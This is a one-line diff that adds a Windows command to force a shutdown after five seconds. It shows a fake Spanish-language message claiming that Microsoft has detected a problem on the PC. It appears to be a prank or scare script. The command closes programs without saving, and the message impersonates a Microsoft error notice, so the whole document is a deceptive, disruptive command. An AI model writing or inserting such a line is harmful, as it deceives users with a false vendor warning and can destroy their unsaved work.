@@ -1,0 +1,1 @@
+shutdown -s -f -t 5 -c "Microsoft ha dedectado un problema en su PC. Su equipo se va a apagar."
